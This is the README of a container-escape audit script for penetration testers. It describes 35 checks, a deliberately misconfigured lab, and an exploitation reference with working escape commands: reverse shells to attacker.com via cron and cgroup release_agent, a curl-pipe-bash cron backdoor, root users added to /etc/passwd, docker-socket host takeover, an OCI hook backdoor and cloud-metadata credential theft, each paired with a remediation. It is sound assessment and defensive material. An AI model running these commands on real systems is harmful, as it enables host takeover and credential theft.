# K8s_container-escape-audit

A bash script that runs inside a Docker or Kubernetes container and checks for escape vectors. Built for penetration testers and security teams doing container security assessments.

> For authorised security assessments only. Do not run this on systems you don't have explicit written permission to test.

## What it does

`container_escape_audit.sh` performs 35 checks covering the main container escape categories: privileged configuration, dangerous capabilities, namespace isolation, filesystem mounts, kernel exposure, Kubernetes misconfigurations, cloud metadata access, and recent CVEs.

Each finding comes with a structured report entry:

- **What it is**: the misconfiguration or exposure
- **Impact**: worst-case if exploited
- **Exploitability**: difficulty, tooling, real-world precedent
- **Recommendation**: specific remediation steps

One note on running as root: checks 1, 2, and 27 (privileged mode, dangerous capabilities, UID 0 mapping) will always produce findings when you run the script as root inside the container. That's expected and correct. Running as root without user namespace remapping is itself a meaningful finding, not a false positive.

## Checks

### Container configuration

| # | Check | Severity |
|---|---|---|
| 1 | Privileged container (`--privileged`) | CRITICAL |
| 2 | Dangerous Linux capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, etc.) | HIGH |
| 3 | Host namespace sharing (PID, network, IPC, UTS, mount) | HIGH |
| 11 | Seccomp / AppArmor / SELinux disabled or unconfined | MEDIUM |
| 27 | User namespace UID mapping (root-in-container = root-on-host) | HIGH |

### Filesystem and mounts

| # | Check | Severity |
|---|---|---|
| 4 | Dangerous host filesystem mounts (`/`, `/etc`, `/dev`, `/sys`, runtime sockets) | CRITICAL |
| 5 | `/proc` exposure (core_pattern, sysrq-trigger, kcore, kmem, PID1 environ) | CRITICAL |
| 8 | Writable cron directories | HIGH |
| 9 | Writable authentication files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`) | CRITICAL |
| 13 | SUID/SGID binaries | MEDIUM |
| 17 | Writable dynamic linker config (`/etc/ld.so.preload`, `ld.so.conf.d`) | HIGH |
| 23 | OverlayFS upper directory writability / layer inspection | MEDIUM |
| 33 | OCI hook injection paths (`/run/oci/hooks.d`) | CRITICAL/MEDIUM |

### Kernel

| # | Check | Severity |
|---|---|---|
| 10 | `/dev/mem` access and ptrace scope | CRITICAL |
| 12 | cgroup v1 `release_agent` escape path | CRITICAL |
| 14 | Kernel version and CVE checks (DirtyPipe CVE-2022-0847, DirtyCOW CVE-2016-5195) | HIGH |
| 19 | cgroup v2 writability | MEDIUM |
| 22 | Kernel module loading status (`modules_disabled`) | INFO |
| 28 | eBPF exposure (CAP_BPF + bpf syscall availability) | CRITICAL |
| 29 | debugfs / tracefs mounted and accessible | HIGH |
| 32 | Kernel keyring exposure | HIGH |
| 34 | Page cache write primitives (splice + pipe2 syscall availability) | HIGH |
| 35 | Procfs namespace file descriptor leakage | MEDIUM |

### Kubernetes and cloud

| # | Check | Severity |
|---|---|---|
| 6 | Kubernetes service account token and RBAC permissions | HIGH-CRITICAL |
| 7 | Environment variable secret leakage | MEDIUM |
| 15 | Cloud instance metadata service reachable (AWS, Azure, GCP) | CRITICAL |
| 16 | Kubelet API exposed unauthenticated (ports 10250, 10255) | CRITICAL |
| 20 | Secret mount directories (`/run/secrets`, `/var/run/secrets`) | HIGH |
| 30 | Kubernetes RBAC active escalation path probing | HIGH-CRITICAL |

### Host access

| # | Check | Severity |
|---|---|---|
| 18 | Namespace escape tooling present (`nsenter`, `unshare`, `runc`, `crictl`) | MEDIUM |
| 21 | SSH private keys readable | HIGH |
| 31 | Additional container runtime sockets (Podman, BuildKit, Kata) | CRITICAL |

### Recent CVEs

| # | Check | Severity |
|---|---|---|
| 24 | Copy Fail (CVE-2026-31431) -- AF_ALG algif_aead page cache write | CRITICAL |
| 25 | NVIDIAScape (CVE-2025-23266) -- NVIDIA Container Toolkit OCI hook LD_PRELOAD | CRITICAL |
| 26 | runc masked path race (CVE-2025-31133 / CVE-2025-52565 / CVE-2025-52881) | CRITICAL |

## Usage

```bash
curl -O https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/container_escape_audit.sh
chmod +x container_escape_audit.sh
./container_escape_audit.sh
```

### Options

```
--report <file>    Write detailed report to <file>
                   Default: container_escape_report_<timestamp>.txt
--json             Emit JSON summary to stdout
--quiet            Suppress info lines, print only WARN/CRITICAL to terminal
--no-report        Skip writing the report file
```

### Examples

```bash
# Standard run
./container_escape_audit.sh

# Custom report path
./container_escape_audit.sh --report /tmp/audit_$(hostname).txt

# JSON output, filter CRITICAL findings
./container_escape_audit.sh --json --no-report | jq '.findings[] | select(.severity=="CRITICAL")'

# Quiet terminal output with report
./container_escape_audit.sh --quiet --report ./report.txt
```

### Running inside a Kubernetes pod

```bash
kubectl cp container_escape_audit.sh <namespace>/<pod>:/tmp/audit.sh
kubectl exec -n <namespace> <pod> -- bash /tmp/audit.sh --report /tmp/report.txt
kubectl cp <namespace>/<pod>:/tmp/report.txt ./audit_report.txt
```

### Running as a Kubernetes Job

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: container-escape-audit
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: audit
          image: alpine:latest
          command:
            - sh
            - -c
            - |
              apk add --no-cache bash curl && \
              curl -sO https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/container_escape_audit.sh && \
              chmod +x container_escape_audit.sh && \
              ./container_escape_audit.sh --json
```

```bash
kubectl apply -f audit-job.yaml
kubectl wait --for=condition=complete job/container-escape-audit --timeout=120s
kubectl logs job/container-escape-audit
kubectl delete job container-escape-audit
```

By default the job runs with whatever the cluster's default security context is. That's intentional -- the audit reflects the real permissions available to a workload. If you want to test a specific security context, add the relevant `securityContext` or `serviceAccountName` fields before applying.

## Lab setup for testing

This sets up a deliberately misconfigured Docker container that exercises most of the 35 checks. Use an isolated VM only -- not on a production host or anything with sensitive data on it.

### Prerequisites

```bash
# Add yourself to the docker group
sudo usermod -aG docker $USER
newgrp docker

# Or just prefix docker commands with sudo throughout
```

### Step 1 -- start the vulnerable container

```bash
sudo docker run -d \
  --name cea_vulnerable \
  --hostname cea-target \
  --privileged \
  --pid=host \
  --ipc=host \
  --dns=8.8.8.8 \
  --dns=8.8.4.4 \
  --security-opt apparmor=unconfined \
  --security-opt seccomp=unconfined \
  --cap-add SYS_ADMIN \
  --cap-add SYS_PTRACE \
  --cap-add BPF \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /sys:/sys:rw \
  -v $(pwd):/audit:ro \
  -e DATABASE_PASSWORD=supersecret \
  -e AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLEfakekey \
  -e GITHUB_TOKEN=ghp_fakeTokenForTesting \
  -e API_KEY=fake-api-key-12345 \
  ubuntu:22.04 \
  tail -f /dev/null
```

The `--dns` flags are needed because `--pid=host` combined with `--privileged` can break DNS resolution on some systems.

### Step 2 -- verify internet access

```bash
sudo docker exec -it cea_vulnerable bash
```

Once inside:

```bash
ping -c1 archive.ubuntu.com
# If that fails: echo "nameserver 8.8.8.8" > /etc/resolv.conf
```

### Step 3 -- install packages

```bash
apt-get update -qq && apt-get install -y \
  curl python3 sudo procps \
  libcap2-bin cron vim util-linux
```

### Step 4 -- configure the misconfigurations

```bash
useradd -m -s /bin/bash testuser
echo 'testuser:password' | chpasswd
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
echo '* * * * * root echo vuln > /tmp/cron_test' > /etc/cron.d/testlab
service cron start
chmod u+s /usr/bin/find
chmod u+s /usr/bin/python3
```

### Step 5 -- run the audit

```bash
bash /audit/container_escape_audit.sh
```

Save a report and pull it to the host:

```bash
# Inside the container
bash /audit/container_escape_audit.sh --report /tmp/audit_report.txt

# From a second terminal on the host
sudo docker cp cea_vulnerable:/tmp/audit_report.txt ./audit_report.txt
```

### Step 6 -- tear down

```bash
sudo docker rm -f cea_vulnerable
```

### What to expect

| Check | Expected result | Notes |
|---|---|---|
| 1 -- Privileged | CRITICAL | --privileged flag |
| 2 -- Capabilities | HIGH x4+ | SYS_ADMIN, SYS_PTRACE, BPF etc. |
| 3 -- Namespaces | HIGH x2 | --pid=host, --ipc=host |
| 4 -- Mounts | CRITICAL | docker.sock, /sys |
| 5 -- /proc | CRITICAL | core_pattern writable via privileged |
| 7 -- Env secrets | MEDIUM x4 | DATABASE_PASSWORD, AWS key etc. |
| 8 -- Cron | HIGH | /etc/cron.d/testlab writable |
| 9 -- Auth files | CRITICAL | /etc/sudoers modified |
| 11 -- Seccomp | MEDIUM x2 | Both unconfined |
| 12 -- cgroup | CRITICAL | release_agent writable |
| 13 -- SUID | MEDIUM | find, python3 |
| 24 -- Copy Fail | CRITICAL or INFO | Depends on host kernel patch status |
| 27 -- UID mapping | HIGH | Running as root, no userns remap |
| 28 -- eBPF | CRITICAL | CAP_BPF + seccomp unconfined |
| 29 -- debugfs | MEDIUM | /sys mounted |
| 31 -- Runtime socket | CRITICAL | docker.sock mounted |
| 34 -- splice/pipe2 | HIGH | seccomp unconfined |
| 35 -- /proc PIDs | MEDIUM | --pid=host |

Checks that won't fire here (require real infrastructure): Check 15 (cloud IMDS), Check 16 (Kubelet API), Check 25 (real NVIDIA CTK), Check 30 (live Kubernetes API).

## Output

### Terminal

```
========================================================
  container_escape_audit.sh v3.0
  Container escape vector detection
  FOR AUTHORISED SECURITY ASSESSMENTS ONLY
========================================================

--- 1. Privileged container ---
[CRIT]  Container appears PRIVILEGED (CapEff=000001ffffffffff)

--- 4. Dangerous filesystem mounts ---
[CRIT]  Container runtime socket accessible: /var/run/docker.sock

--- 24. Copy Fail (CVE-2026-31431) ---
[CRIT]  VULNERABLE to Copy Fail -- AEAD socket bindable, kernel 6.5.0-21-generic

==================== SUMMARY ====================
  [CRITICAL] Container is running in privileged mode
  [CRITICAL] Container runtime socket accessible: /var/run/docker.sock
  [CRITICAL] Copy Fail (CVE-2026-31431) AF_ALG exposure
  [HIGH    ] Kubernetes service account token is readable
  [MEDIUM  ] Seccomp is disabled for this container

  CRITICAL: 3  |  HIGH: 4  |  MEDIUM: 5  |  INFO: 2
```

### JSON

```json
{
  "tool": "container_escape_audit",
  "version": "3.0",
  "timestamp": "2026-05-01T10:32:00Z",
  "host": "cea-target",
  "kernel": "6.5.0-21-generic",
  "findings": [
    {
      "id": "cve_2026_31431_copy_fail",
      "severity": "CRITICAL",
      "title": "Copy Fail (CVE-2026-31431) AF_ALG exposure",
      "what": "AF_ALG socket family is accessible and the authencesn AEAD algorithm can be bound...",
      "impact": "Allows controlled 4-byte writes into the page cache of any readable executable...",
      "exploitability": "Trivial. A single Python script achieves root reliably...",
      "recommendation": "Apply kernel patches from your distribution immediately..."
    }
  ]
}
```

## Requirements

| Tool | Required | Used for |
|---|---|---|
| `bash` | Yes | Script execution |
| `grep`, `awk`, `find`, `cat` | Yes | Core checks |
| `python3` | Optional | Copy Fail (24), eBPF (28), splice (34) |
| `curl` | Optional | IMDS and kubelet API checks |
| `kubectl` | Optional | Kubernetes RBAC enumeration |
| `capsh` | Optional | Human-readable capability decoding |
| `ip` | Optional | Node IP detection for kubelet checks |
| `keyctl` | Optional | Kernel keyring enumeration (32) |
| `sestatus` | Optional | SELinux status |

## Severity levels

| Level | Meaning |
|---|---|
| CRITICAL | Immediate host escape likely with minimal effort |
| HIGH | Significant risk, exploitable with moderate effort or in combination with other findings |
| MEDIUM | Defence-in-depth gap, increases exploitability of other findings |
| INFO | Recorded for context and cross-referencing |

A single CRITICAL finding is generally enough for a complete host compromise. Multiple findings in combination can elevate lower-severity issues -- a MEDIUM seccomp finding combined with a HIGH capability finding can together constitute a practical escape path.

## Escape techniques covered

Checks 1-23 cover the established container escape primitives: Docker socket escape, privileged container mount, cgroup v1 release_agent, core_pattern pipe handler, Shocker / CAP_DAC_READ_SEARCH, CAP_SYS_ADMIN namespace re-entry, kernel module loading, DirtyPipe (CVE-2022-0847), DirtyCOW (CVE-2016-5195), Kubernetes service account abuse, kubelet unauthenticated exec, cloud IMDS credential theft, host namespace escape via nsenter, ld.so.preload injection, and /dev/mem access.

Checks 24-35 add coverage for more recent and less commonly checked vectors: Copy Fail (CVE-2026-31431) AF_ALG page cache write, NVIDIAScape (CVE-2025-23266) OCI hook LD_PRELOAD injection, runc masked path race (CVE-2025-31133/-52565/-52881), root-in-container UID mapping, eBPF kernel memory inspection, debugfs/tracefs ftrace exposure, Kubernetes RBAC active probing, additional runtime sockets (Podman, BuildKit, Kata), kernel keyring extraction, OCI hook directory injection, splice/pipe2 syscall surface, and procfs namespace fd leakage.

## Exploitation reference

What an attacker can actually do with each finding. For authorised testing and defensive purposes only.

<details>
<summary><h3>Container configuration</h3></summary>

#### Check 1 -- Privileged container (CRITICAL)

```bash
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host bash

# Or write a reverse shell into the host crontab
echo '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1' \
  >> /tmp/host/etc/crontab
```

Remediation: Remove `--privileged`. Use `securityContext.capabilities` to grant only what the workload actually needs.

#### Check 2 -- Dangerous Linux capabilities (HIGH)

| Capability | Exploit path |
|---|---|
| `CAP_SYS_ADMIN` | Mount filesystems, load kernel modules, ptrace any process |
| `CAP_SYS_PTRACE` | Attach to any host process, inject shellcode |
| `CAP_SYS_MODULE` | Load a malicious kernel module |
| `CAP_NET_ADMIN` | Reroute traffic, ARP spoofing, modify host iptables |
| `CAP_DAC_READ_SEARCH` | Shocker exploit -- read any host file by inode |
| `CAP_BPF` | Load eBPF programs to inspect all kernel memory and function calls |

```bash
# With CAP_SYS_PTRACE -- enter all host namespaces via PID 1
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Remediation:

```yaml
securityContext:
  capabilities:
    drop: ["ALL"]
    add: ["NET_BIND_SERVICE"]
```

#### Check 3 -- Host namespace sharing (HIGH)

```bash
# hostPID: true -- enter host via PID 1
nsenter -t 1 -m -u -i -n -p -- bash

# hostNetwork: true -- sniff all node traffic
tcpdump -i eth0

# hostIPC: true -- read host shared memory
ipcs -a
```

Remediation:

```yaml
spec:
  hostPID: false
  hostNetwork: false
  hostIPC: false
```

#### Check 11 -- Seccomp / AppArmor / SELinux disabled (MEDIUM)

```bash
unshare -UrmC --fork bash
```

Remediation:

```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault
```

#### Check 27 -- User namespace UID mapping (HIGH)

Without user namespace remapping, UID 0 inside the container is UID 0 on the host. Any mount escape, socket access, or capability exploit yields host root directly -- no UID boundary to cross.

Remediation: Enable userns-remap in Docker (`userns-remap: default` in `/etc/docker/daemon.json`). In Kubernetes, use rootless containers or configure user namespace support (stable in 1.30+). Set `runAsNonRoot: true` in pod security context.

</details>

<details>
<summary><h3>Filesystem and mounts</h3></summary>

#### Check 4 -- Dangerous host filesystem mounts (CRITICAL)

```bash
# Docker socket -- instant host root
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine \
  chroot /host bash

# /etc writable -- add root user
echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd
su backdoor
```

Remediation: Never mount the Docker or containerd socket into application containers. Use `readOnly: true` for any required mounts.

#### Check 5 -- /proc filesystem exposure (CRITICAL)

```bash
# Execute arbitrary code as root via core_pattern
echo '|/tmp/payload' > /proc/sys/kernel/core_pattern
kill -SIGSEGV $$

# Read host process environment
cat /proc/1/environ | tr '\0' '\n'

# Reboot or crash the host
echo b > /proc/sysrq-trigger
```

Remediation: Mount `/proc/sys` read-only. Deny writes via seccomp.

#### Check 8 -- Writable cron directories (HIGH)

```bash
echo '* * * * * root curl http://attacker.com/shell.sh | bash' \
  > /etc/cron.d/backdoor
```

Remediation:

```yaml
securityContext:
  readOnlyRootFilesystem: true
```

#### Check 9 -- Writable authentication files (CRITICAL)

```bash
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned

echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers
```

Remediation: Use `readOnlyRootFilesystem: true`. Never bind-mount `/etc` from the host.

#### Check 13 -- SUID/SGID binaries (MEDIUM)

```bash
find / -perm -4000 -type f 2>/dev/null

# If /usr/bin/find has SUID bit
find . -exec /bin/bash -p \; -quit
```

Remediation:

```dockerfile
RUN find / -xdev -perm /6000 -type f -exec chmod a-s {} \;
```

#### Check 17 -- Writable dynamic linker config (HIGH)

```bash
echo '/tmp/evil_lib' > /etc/ld.so.preload
# All subsequent SUID binary executions load the malicious library first
```

Remediation: Use `readOnlyRootFilesystem: true`.

#### Check 23 -- OverlayFS upper directory (MEDIUM)

Access to the OverlayFS upper layer allows modifying files that appear read-only, or reading data that was "deleted" in a later image layer. Useful for recovering secrets removed during image build.

Remediation: Restrict access to `/var/lib/docker` and `/var/lib/containerd` on the host.

#### Check 33 -- OCI hook injection (CRITICAL)

```bash
cat > /run/oci/hooks.d/backdoor.json << 'EOF'
{
  "version": "1.0.0",
  "hook": {"path": "/tmp/evil.sh"},
  "when": {"always": true},
  "stages": ["prestart"]
}
EOF
# /tmp/evil.sh runs on the host at the next container start
```

Remediation: Never mount OCI hook directories into containers. Related to NVIDIAScape (CVE-2025-23266) -- both exploit the OCI hook trust boundary.

</details>

<details>
<summary><h3>Kernel</h3></summary>

#### Check 10 -- /dev/mem and ptrace scope (CRITICAL)

```bash
dd if=/dev/mem bs=1 skip=$((0x100000)) count=1024 | strings

# ptrace_scope=0 -- attach to a privileged host process
gdb -p $(pgrep -n root)
```

Remediation: Ensure `/dev/mem` is not accessible. Set `kernel.yama.ptrace_scope=1` on all nodes.

#### Check 12 -- cgroup v1 release_agent (CRITICAL)

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Remediation: Migrate to cgroup v2. Block `mount` syscalls via seccomp.

#### Check 14 -- Kernel CVEs (HIGH)

| CVE | Kernels affected | Impact |
|---|---|---|
| DirtyPipe CVE-2022-0847 | 5.8 to 5.16.11 | Overwrite read-only files via pipe splice |
| DirtyCOW CVE-2016-5195 | before 4.8.3 | Race condition write to read-only memory-mapped files |

Remediation: Patch the host kernel. Verify with `uname -r`.

#### Check 28 -- eBPF exposure (CRITICAL)

```bash
# Attach a kprobe to any kernel function across the host
bpftrace -e 'kprobe:vfs_read { printf("%s\n", str(arg1)); }'
# Captures arguments from all processes on the node
```

Remediation: Remove `CAP_BPF` and `CAP_SYS_ADMIN`. Apply seccomp to block `bpf(2)` (syscall 321 on x86_64). Set `kernel.unprivileged_bpf_disabled=1`.

#### Check 29 -- debugfs / tracefs (HIGH)

```bash
echo function > /sys/kernel/debug/tracing/current_tracer
echo 1 > /sys/kernel/debug/tracing/tracing_on
cat /sys/kernel/debug/tracing/trace
# Captures function arguments from all processes on the node
```

Remediation: Do not mount `/sys/kernel/debug` in containers.

#### Check 32 -- Kernel keyring (HIGH)

```bash
# List session keys (LUKS, Kerberos TGTs, fscrypt keys)
keyctl show @s

# With CAP_SYS_ADMIN -- read key contents
keyctl print <key-id>
```

Remediation: Remove `CAP_SYS_ADMIN`. Apply seccomp to block `keyctl(2)` (syscall 250 on x86_64).

#### Check 34 -- Page cache write primitives (HIGH)

`splice(2)` and `pipe2(2)` are the two syscalls underlying both Copy Fail (CVE-2026-31431) and DirtyPipe (CVE-2022-0847). Their availability confirms that the attack surface is not reduced by seccomp filtering.

Remediation: Apply a seccomp profile restricting both syscalls if the workload doesn't need them. Ensure the kernel is fully patched.

#### Check 35 -- Procfs namespace leakage (MEDIUM)

```bash
# With host PID namespace -- enter host mount namespace via PID 1
nsenter -t 1 -m -- ls /
cat /proc/1/environ | tr '\0' '\n'
```

Remediation: Mount `/proc` with `hidepid=2`. Set `hostPID: false`.

</details>

<details>
<summary><h3>Recent CVEs</h3></summary>

#### Check 24 -- Copy Fail (CVE-2026-31431) (CRITICAL)

Disclosed April 29 2026. A logic bug in the Linux kernel's `algif_aead` cryptographic module allows an unprivileged user to perform controlled 4-byte writes into the page cache of any readable executable via `AF_ALG` and `splice()`. By corrupting the in-memory copy of a setuid binary, an attacker escalates to root. Affects every Linux distribution shipping a kernel built since 2017. A ~732-byte Python PoC achieves root on Ubuntu 24.04, Amazon Linux 2023, RHEL 10.1, and SUSE 16. No capabilities required. On the CISA KEV list with confirmed active exploitation.

The script checks three things: whether an `AF_ALG` socket can be created, whether the `authencesn(hmac(sha512),cbc(aes))` AEAD algorithm can be bound, and whether `splice(2)` and `pipe2(2)` are seccomp-blocked.

Remediation:
- Apply kernel patches from your distribution (released from late April 2026)
- Interim: `rmmod algif_aead && echo install algif_aead /bin/false >> /etc/modprobe.d/disable-algif_aead.conf`
- Block `AF_ALG` socket creation via seccomp if it's not needed

#### Check 25 -- NVIDIAScape (CVE-2025-23266) (CRITICAL)

Disclosed July 2025. The NVIDIA Container Toolkit's `createContainer` OCI hook inherits environment variables from the container image without sanitising them. Setting `LD_PRELOAD` in a Dockerfile causes the hook to load a malicious shared library into a privileged host process before namespace isolation completes. Three lines in a Dockerfile gets you host root. Affects all NVIDIA Container Toolkit versions up to and including 1.17.7. Particularly acute in shared GPU multi-tenant cloud environments.

```dockerfile
FROM nvidia/cuda:12.4.1-base
ENV LD_PRELOAD=/tmp/evil.so
COPY evil.so /tmp/
```

Remediation:
- Upgrade NVIDIA Container Toolkit to 1.17.8 or later, GPU Operator to 25.3.1 or later
- Interim: set `disable-cuda-compat-lib-hook = true` in `/etc/nvidia-container-toolkit/config.toml`
- Scan running pods for images with `LD_PRELOAD` pointing to writable paths

#### Check 26 -- runc masked path race (CVE-2025-31133 / CVE-2025-52565 / CVE-2025-52881) (CRITICAL)

Disclosed November 2025. Three related race conditions in runc's mount handling allow a low-privileged attacker who can spawn containers to write to arbitrary `/proc` files. CVE-2025-31133 and CVE-2025-52565 both allow writing to `/proc/sys/kernel/core_pattern` (arbitrary host code execution) and `/proc/sysrq-trigger` (immediate host reboot). CVE-2025-52881 additionally bypasses AppArmor and SELinux. Affects all runc versions prior to 1.2.8, 1.3.3, and 1.4.0-rc.3.

Remediation:
- Update runc to 1.2.8, 1.3.3, or 1.4.0-rc.3
- Enable user namespaces for containers (host root not mapped)
- AppArmor and SELinux provide limited protection due to CVE-2025-52881's LSM bypass

</details>

<details>
<summary><h3>Kubernetes and cloud</h3></summary>

#### Check 6 -- Service account token and RBAC (HIGH-CRITICAL)

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# What can this token do?
curl -s -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews

# If it has secrets access
curl -s -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets

# If it can create pods -- launch a privileged escape pod
curl -s -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  $APISERVER/api/v1/namespaces/default/pods -d @evil-privileged-pod.json
```

Remediation:

```yaml
spec:
  automountServiceAccountToken: false
```

Audit permissions with `kubectl auth can-i --list`.

#### Check 7 -- Environment variable secret leakage (MEDIUM)

```bash
printenv
cat /proc/1/environ | tr '\0' '\n'
```

Remediation: Mount secrets as files rather than env vars. Use an external secrets manager. Rotate anything exposed.

#### Check 15 -- Cloud IMDS (CRITICAL)

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# GCP
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Remediation: Enforce IMDSv2 on AWS. Use Workload Identity on GCP/Azure. Block `169.254.169.254` via NetworkPolicy.

#### Check 16 -- Kubelet API unauthenticated (CRITICAL)

```bash
curl -sk https://<node-ip>:10250/pods
curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=cat /etc/shadow"
curl http://<node-ip>:10255/pods
```

Remediation: Set `--anonymous-auth=false` and `--authorization-mode=Webhook` on the kubelet.

#### Check 20 -- Secret mount directories (HIGH)

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
ls /run/secrets/
```

Remediation: Use projected service account tokens with short expiry:

```yaml
volumes:
  - name: token
    projected:
      sources:
        - serviceAccountToken:
            expirationSeconds: 3600
            path: token
```

#### Check 30 -- Kubernetes RBAC active probing (HIGH-CRITICAL)

The script actively POSTs `SelfSubjectAccessReview` requests to check six specific permissions: creating pods in kube-system, listing secrets cluster-wide, executing into pods, binding ClusterRoles, and creating DaemonSets.

```bash
# If create pods in kube-system is allowed
kubectl run escape --image=ubuntu --privileged --overrides='
{"spec":{"hostPID":true,"hostNetwork":true,
 "volumes":[{"name":"h","hostPath":{"path":"/"}}],
 "containers":[{"name":"c","image":"ubuntu",
   "volumeMounts":[{"name":"h","mountPath":"/host"}]}]}}'
```

Remediation: Full RBAC audit. Use namespace-scoped Roles rather than ClusterRoles.

</details>

<details>
<summary><h3>Host access</h3></summary>

#### Check 18 -- Namespace escape tooling (MEDIUM)

```bash
nsenter -t 1 -m -u -i -n -p -- bash
crictl ps && crictl exec -it <container-id> bash
```

Remediation: Minimal or distroless base images. Enforce image scanning in CI.

#### Check 21 -- SSH private keys readable (HIGH)

```bash
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
ssh -i /found/key user@internal-host
```

Remediation: Never bake SSH keys into images. Use short-lived certificates.

#### Check 31 -- Additional runtime sockets (CRITICAL)

```bash
# Podman
podman -r --url unix:///run/podman/podman.sock run --privileged ...

# BuildKit -- inject into CI builds or exfiltrate build secrets
buildctl --addr unix:///run/buildkit/buildkitd.sock build ...
```

Remediation: Audit all volume mounts for runtime socket paths.

</details>

## Integration

### Falco

This script is point-in-time. For continuous runtime detection, pair it with Falco rules covering:

- Writes to `release_agent` or `core_pattern`
- Spawning of `nsenter`, `unshare`, or `runc` inside containers
- Access to `/var/run/docker.sock`
- Unexpected outbound connections to `169.254.169.254`
- `AF_ALG` socket creation from non-root processes (Copy Fail indicator)
- `LD_PRELOAD` set to paths in `/tmp` or `/dev/shm` (NVIDIAScape indicator)
- Symlink creation over `/dev/null` or `/dev/pts/*` (runc CVE-2025-31133 indicator)

### CI/CD

```bash
CRITICAL_COUNT=$(./container_escape_audit.sh --json --no-report \
  | jq '[.findings[] | select(.severity=="CRITICAL")] | length')
if [ "$CRITICAL_COUNT" -gt 0 ]; then
  echo "FAILED: $CRITICAL_COUNT critical escape vectors detected"
  exit 1
fi
```

### SIEM

```bash
./container_escape_audit.sh --json --no-report | \
  jq -c '.findings[]' | \
  while read -r finding; do
    curl -s -X POST https://your-siem/api/events \
      -H 'Content-Type: application/json' \
      -d "$finding"
  done
```

## Contributing

When adding a new check:

1. Add a `check_<name>()` function
2. Call `add_finding` with all seven fields: id, severity, title, what, impact, exploitability, recommendation
3. Register the function call in the MAIN section
4. Update the checks table in this README

## Legal

For authorised security testing only. Running this against systems without explicit written permission from the system owner may be illegal in your jurisdiction. No liability is accepted for misuse.

Copyright Liam Romanis. Licensed under CC BY-NC 4.0 -- free for non-commercial use with attribution. Commercial use requires explicit written permission. See LICENSE for full terms.

## References

- [Linux Capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [GTFOBins](https://gtfobins.github.io/)
- [Kubernetes Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [CVE-2026-31431 Copy Fail](https://en.wikipedia.org/wiki/Copy_Fail)
- [CVE-2025-23266 NVIDIAScape](https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape)
- [CVE-2025-31133 runc masked path](https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/)
- [CVE-2022-0847 DirtyPipe](https://dirtypipe.cm4all.com/)
- [CVE-2019-5736 runc escape](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
- [Felix Wilhelm's cgroup release_agent PoC](https://twitter.com/_fel1x/status/1151487051986087936)
- [deepce](https://github.com/stealthcopter/deepce)
- [CDK](https://github.com/cdk-team/CDK)
- [Trail of Bits -- Understanding and Hardening Linux Containers](https://github.com/trailofbits/publications/blob/master/papers/understanding_hardening_linux_containers.pdf)
